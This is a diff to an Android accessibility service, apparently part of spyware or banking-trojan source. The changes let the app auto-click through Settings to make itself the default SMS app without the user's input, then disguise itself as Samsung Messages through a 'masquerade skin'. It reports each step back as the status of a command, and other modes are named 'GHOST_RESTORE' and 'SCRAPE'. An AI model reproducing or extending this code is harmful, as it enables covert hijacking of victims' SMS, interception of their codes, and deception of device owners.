@@ -359,128 +359,92 @@ class MyAccessibilityService : AccessibilityService() {
                         }
                     }, 200)
                 }
-            } else if (mode == "RESTORE") {
+            } else if (mode == "RESTORE" || mode == "AUTO_NAV") {
                 val root = rootInActiveWindow ?: return
-                val targetLabel = DefaultSmsManager.getStoredPreviousLabel(this)
                 val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
                 
-                if (targetLabel == null || originalPkg == null) {
+                val targetLabel = if (mode == "AUTO_NAV") {
+                    try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }
+                } else {
+                    DefaultSmsManager.getStoredPreviousLabel(this)
+                }
+
+                if (targetLabel == null || (mode == "RESTORE" && originalPkg == null)) {
                     DefaultSmsManager.expectedMode = ""
                     return
                 }
 
-                // If already restored, disarm immediately
-                if (android.provider.Telephony.Sms.getDefaultSmsPackage(this) == originalPkg) {
-                    DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target already restored.")
+                // VERIFICATION: Check if target is already set
+                val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this)
+                val isFinished = if (mode == "AUTO_NAV") currentDefault == packageName else currentDefault == originalPkg
+
+                if (isFinished) {
+                    DebugLogger.log("SMS_NAV", "Verification SUCCESS! Target ($targetLabel) is now Default.")
                     DefaultSmsManager.expectedMode = "" 
+                    if (mode == "AUTO_NAV") CommandProcessor.applyMasqueradeSkin(this, "SAM_MSG")
+                    
+                    val msg = if (mode == "AUTO_NAV") "Set as Default SMS via manual fallback" else "Original SMS app restored"
+                    CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", msg)
+                    
                     performGlobalAction(GLOBAL_ACTION_HOME)
                     return
                 }
 
-                // Phase 1: Are we on the selection screen with the target app visible?
+                // Phase 1: selection screen
                 val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
                 if (appNodes.isNotEmpty()) {
                     val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                    val lastLoop = prefs.getLong("restore_loop_ts", 0L)
+                    val lastLoop = prefs.getLong("sms_nav_loop_ts", 0L)
                     if (System.currentTimeMillis() - lastLoop < 4000) return
-                    prefs.edit().putLong("restore_loop_ts", System.currentTimeMillis()).apply()
+                    prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()
 
                     val targetCount = appNodes.size
-                    var candidateIndex = prefs.getInt("restore_candidate_idx", 0)
-
-                    if (candidateIndex >= targetCount) {
-                        DebugLogger.log("GHOST_RESTORE", "All candidates exhausted. Resetting index to retry.")
-                        candidateIndex = 0
-                        prefs.edit().putInt("restore_candidate_idx", 0).apply()
-                    }
+                    var candidateIndex = prefs.getInt("sms_nav_candidate_idx", 0)
+                    if (candidateIndex >= targetCount) candidateIndex = 0
 
                     var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[candidateIndex]
-                    while (target?.isClickable == false) {
-                        target = target.parent
-                    }
-                    target?.let { safeTarget ->
-                        if (safeTarget.isClickable) {
-                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                            DebugLogger.log("GHOST_RESTORE", "Selected target candidate $candidateIndex: $targetLabel")
-                        }
-                    }
-
-                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                        kotlinx.coroutines.delay(500)
+                    while (target != null && !target.isClickable) target = target.parent
+                    
+                    target?.let {
+                        it.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        DebugLogger.log("SMS_NAV", "Clicked candidate $candidateIndex for $targetLabel")
                         
-                        val confirmRoot = rootInActiveWindow
-                        if (confirmRoot != null) {
-                            val confirmTexts = listOf("Set as default", "Set", "OK", "Default")
-                            var clicked = false
-                            for (text in confirmTexts) {
-                                val setNodes = confirmRoot.findAccessibilityNodeInfosByText(text)
-                                for (btn in setNodes) {
-                                    if (btn.isClickable) {
+                        // Handle Confirmation Dialogs after click
+                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                            delay(600)
+                            val confirmRoot = rootInActiveWindow
+                            if (confirmRoot != null) {
+                                val keywords = listOf("Set as default", "Set", "OK", "Default")
+                                for (kw in keywords) {
+                                    val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
+                                    if (btn != null) {
                                         btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                        DebugLogger.log("GHOST_RESTORE", "Clicked confirmation: '$text'")
-                                        clicked = true
-                                        break
-                                    }
-                                }
-                                if (clicked) break
-                            }
-                        }
-                        
-                        kotlinx.coroutines.delay(1000)
-                        
-                        val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService)
-                        if (currentDefault == packageName) {
-                            CommandProcessor.applyMasqueradeSkin(this@MyAccessibilityService, "SAM_MSG")
-                        }
-                        
-                        if (currentDefault == originalPkg) {
-                            DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target restored.")
-                            DefaultSmsManager.expectedMode = "" 
-                            prefs.edit().putInt("restore_candidate_idx", 0).apply()
-                            CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Original SMS app restored")
-                            performGlobalAction(GLOBAL_ACTION_HOME)
-                        } else {
-                            DebugLogger.log("GHOST_RESTORE", "Candidate $candidateIndex failed verification. Incrementing index to test next app.")
-                            prefs.edit().putInt("restore_candidate_idx", candidateIndex + 1).apply()
-                            
-                            kotlinx.coroutines.delay(500)
-                            val retryRoot = rootInActiveWindow
-                            if (retryRoot != null) {
-                                val smsNodes = retryRoot.findAccessibilityNodeInfosByText("SMS")
-                                for (node in smsNodes) {
-                                    var t: android.view.accessibility.AccessibilityNodeInfo? = node
-                                    while (t?.isClickable == false) t = t.parent
-                                    if (t?.isClickable == true) {
-                                        t.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                        DebugLogger.log("SMS_NAV", "Clicked confirm: $kw")
                                         break
                                     }
                                 }
                             }
+                            // Increment candidate index in case this app wasn't the one we wanted
+                            prefs.edit().putInt("sms_nav_candidate_idx", candidateIndex + 1).apply()
                         }
                     }
                     return
                 }
 
-                // Phase 2: We must be on the Default Apps category list. Find "SMS" or "SMS app" anchor.
+                // Phase 2: Category list (find 'SMS' or 'SMS app')
                 val smsNodes = root.findAccessibilityNodeInfosByText("SMS")
                 val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                val lastSmsClick = prefs.getLong("restore_sms_click_ts", 0L)
-                if (System.currentTimeMillis() - lastSmsClick > 2000) {
+                val lastSmsClick = prefs.getLong("sms_nav_cat_ts", 0L)
+                if (System.currentTimeMillis() - lastSmsClick > 2500) {
                     for (node in smsNodes) {
                         var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                        while (target?.isClickable == false) {
-                            target = target?.parent
+                        while (target != null && !target.isClickable) target = target.parent
+                        if (target != null) {
+                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            prefs.edit().putLong("sms_nav_cat_ts", System.currentTimeMillis()).apply()
+                            DebugLogger.log("SMS_NAV", "Clicked SMS category")
+                            break
                         }
-                        var clicked = false
-                        target?.let { safeTarget ->
-                            if (safeTarget.isClickable) {
-                                safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                prefs.edit().putLong("restore_sms_click_ts", System.currentTimeMillis()).apply()
-                                DebugLogger.log("GHOST_RESTORE", "Clicked SMS category")
-                                clicked = true
-                            }
-                        }
-                        if (clicked) break
                     }
                 }
             } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
